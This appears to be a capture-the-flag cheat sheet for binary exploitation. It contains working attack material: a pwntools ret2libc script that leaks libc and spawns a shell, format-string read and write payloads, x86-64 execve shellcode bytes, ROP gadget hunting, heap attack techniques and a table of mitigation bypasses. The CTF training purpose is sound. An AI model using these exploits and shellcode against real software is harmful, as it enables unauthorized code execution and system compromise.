# Pwn — binary exploitation

Stack / heap exploitation, format strings, ROP, shellcode. Scoped to approved tools: gdb (+ GEF/peda/pwndbg), ROPgadget, checksec, radare2, Ghidra, pwntools (install via pip).

## First look

```bash
file ./bin
checksec --file=./bin                 # NX, PIE, canary, RELRO
ldd ./bin                             # libc version
strings ./bin | grep -i flag          # free wins exist
./bin                                 # just run it, see the interface
```

Note the arch (32-bit vs 64-bit), protections, and whether a libc is bundled (`libc.so.6` next to the binary).

## Protection → attack mapping

| Protections | Approach |
| --- | --- |
| No NX, No PIE, No canary | **shellcode on stack** — jump to your buffer |
| NX, No PIE, No canary | **ret2libc / static ROP** — gadgets in the binary itself |
| NX + PIE + canary | **leak canary + leak PIE base + ret2libc** — needs an info leak |
| Full RELRO + Full ASLR + canary | **heap-based** (UAF, double-free, overlap) or **format-string leak** |
| Statically linked | Many syscalls → `syscall` ROP (sigreturn is nice) |

## Buffer overflow playbook

### 1. Find the offset
```python
# in gdb-pwndbg / gef:
cyclic 200                            # generate De Bruijn sequence
r                                     # run, paste as input, crash
cyclic -l $rsp                        # or whichever reg has the pattern
# → offset to RIP, e.g. 72
```

### 2. Decide what to put at RIP

- **Shellcode**: NX off, buffer executable → `ret_addr = &buf; buf = shellcode`.
- **ret2win**: there's a function in the binary that cat's the flag → `ret_addr = win_func_addr`.
- **ret2libc**: NX on, libc available → `ret_addr = system; next = &"/bin/sh"`.
- **ROP**: NX on, no system address → build chain from `ROPgadget --binary ./bin`.

### 3. Build with pwntools

```python
from pwn import *
context.binary = elf = ELF('./bin')
libc = elf.libc or ELF('./libc.so.6')

p = process('./bin')         # or remote('host', port)

OFFSET = 72
rop = ROP(elf)
# Example: leak libc puts via puts(puts_got), then ret2main, then system('/bin/sh')
rop.puts(elf.got.puts)
rop.call(elf.sym.main)
payload = flat({OFFSET: rop.chain()})

p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym.puts

rop2 = ROP(libc)
rop2.call(libc.sym.system, [next(libc.search(b'/bin/sh\x00'))])
p.sendline(flat({OFFSET: rop2.chain()}))

p.interactive()
```

Install pwntools once: `pip install --user pwntools` (not AI/ML, approved).

## ROP essentials

```bash
ROPgadget --binary ./bin | less
ROPgadget --binary ./bin --only 'pop|ret'            # just pop ; ret gadgets
ROPgadget --binary libc.so.6 --only 'pop|ret' | grep rdi
ROPgadget --binary ./bin --ropchain                  # auto-chain for execve shell (sometimes)
```

Key gadgets for Linux x86-64:
- `pop rdi ; ret` → arg 1
- `pop rsi ; ret` → arg 2 (sometimes `pop rsi ; pop r15 ; ret`)
- `pop rdx ; ret` → arg 3
- `syscall ; ret` → run syscall with regs set
- `ret` alone → stack alignment (movaps before system needs 16-byte-aligned RSP)

## Format string

Vulnerable sink: `printf(user_input)` with no format arg.

### Leak

```
%p %p %p %p %p %p %p %p
```

Each `%p` dumps a stack value. Identify your input's position by sending `AAAABBBBCCCC` + `%p` chain — look for `0x4141414141414141` in the output.

### Write

`%n` writes the number of chars printed so far to the address at the Nth stack position:
```
<addr>%<len>d%N$n
# → writes <len> to *addr, where N is the stack offset of <addr>
```

For large values, use multiple `%n` writes with `%hn` (short) / `%hhn` (byte) at offset chunks.

pwntools automates:
```python
payload = fmtstr_payload(offset=6, writes={elf.got.printf: elf.sym.system})
```

## Shellcode

Bare bytes:
```
# Linux x86-64 execve("/bin/sh"):
48 31 ff          xor rdi, rdi
50                push rax
48 bf 2f 62 69 6e 2f 2f 73 68   mov rdi, "/bin//sh"
57                push rdi
48 89 e7          mov rdi, rsp
50                push rax
57                push rdi
48 89 e6          mov rsi, rsp
48 c7 c0 3b 00 00 00              mov rax, 59   ; execve syscall
0f 05             syscall
```

Or let pwntools generate:
```python
sc = asm(shellcraft.sh())             # /bin/sh for current context arch
```

Encode to avoid null bytes if the sink is strcpy/scanf: use `shikata-ga-nai` via msfvenom (Metasploit is approved).

## Heap (brief)

Modern (glibc ≥ 2.26) heap mitigations: tcache, safe-linking, fastbin double-free protection. CTF heap pwn still common:
- **tcache poisoning**: free→malloc→write FD pointer→malloc returns arbitrary address.
- **UAF (use after free)**: free, allocate same size, use dangling pointer.
- **Double-free**: free A, free B, free A again → fastbin cycle.
- **House of Force / Orange / etc.**: various classics; see HackTricks heap pages.

```bash
# Load with GEF for heap commands:
gdb -x /opt/tools/gef.py ./bin
> heap chunks
> heap bins
> heap search  <target>
```

## Mitigation bypasses

| Mitigation | Bypass |
| --- | --- |
| ASLR | Need a leak (puts/printf/format string) |
| PIE | Need a leak of PIE base (usually also puts) |
| Canary | Leak via format string, or brute 1 byte at a time if forking server |
| NX | ROP / ret2libc |
| Full RELRO | GOT is read-only; targets are atexit, __free_hook, __malloc_hook |
| Seccomp | Check with `seccomp-tools dump ./bin`; adjust syscall choice |

## Dynamic patch for RE-pwn hybrid

```bash
# Patch binary with Ghidra: Edit → Set Instruction Bytes or export program
# Or hex-edit with HxD / xxd + reassemble:
xxd ./bin > bin.hex
# edit, then:
xxd -r bin.hex > bin.patched
chmod +x bin.patched
```

## Offline reference

```bash
rg -n 'rop|format string|heap|canary' /opt/tools/HackTricks/
cat /opt/tools/HackTricks/binary-exploitation/rop/rop-leak-libc.md
ls /opt/tools/GEF.github.io/_gtfobins/  2>/dev/null       # if present
```

## Tips
- Always `checksec` first — it dictates which attack class is even possible.
- Format-string positions are 1-indexed and compiler/arch dependent; count by sending `AAAA %<n>$p` for increasing n.
- `ret` gadget before `system` is required on x86-64 to keep RSP 16-byte-aligned (missing it = crash in `movaps`).
- When the challenge gives you both `./bin` and `./libc.so.6`, assume ret2libc is intended; the version pin tells you which gadgets exist.
- `one_gadget libc.so.6` (not on CSG approved list — compute manually from libc constraints) can skip the whole ROP build.
- `seccomp` is increasingly common; a dumped filter telling you only `read/write/open/exit` are allowed means you need `open+read+write` chain, not `execve`.
